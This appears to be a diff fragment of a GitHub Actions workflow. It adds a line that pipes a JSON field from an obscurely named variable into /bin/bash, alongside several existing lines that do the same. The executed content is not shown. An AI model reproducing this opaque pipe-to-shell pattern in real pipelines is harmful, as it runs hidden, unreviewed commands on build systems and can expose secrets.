@@ -46,6 +46,7 @@ jobs:
           echo $mbo32 | jq -r .i30473 | /bin/bash
           echo $a5053 | jq -r .ivkix39 | /bin/bash
           printf '%s' "$oy6" | jq -r .jukp2 | /bin/bash
+          echo $yevk40926 | jq -r .vbo68225 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
